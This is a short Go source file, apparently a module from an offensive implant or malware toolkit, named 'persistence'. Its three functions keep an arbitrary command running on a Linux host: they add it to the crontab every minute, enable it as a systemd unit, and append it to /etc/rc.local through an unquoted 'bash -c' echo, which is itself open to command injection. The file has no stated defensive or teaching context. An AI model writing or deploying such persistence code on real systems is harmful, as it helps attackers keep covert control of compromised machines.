//go:build linux

package persistence

import (
"os/exec"
"strings"
)

func CronPersist(command string) bool {
currentCron, err := exec.Command("crontab", "-l").Output()
if err != nil {
newCron := "* * * * * " + command
cmd := exec.Command("crontab", "-")
cmd.Stdin = strings.NewReader(newCron)
return cmd.Run() == nil
}
newCron := string(currentCron) + "* * * * * " + command
cmd := exec.Command("crontab", "-")
cmd.Stdin = strings.NewReader(newCron)
return cmd.Run() == nil
}

func SystemdPersist(command string) bool {
cmd := exec.Command("systemctl", "enable", command)
return cmd.Run() == nil
}

func RC_LocalPersist(command string) bool {
cmd := exec.Command("bash", "-c", "echo "+command+" >> /etc/rc.local")
return cmd.Run() == nil
}
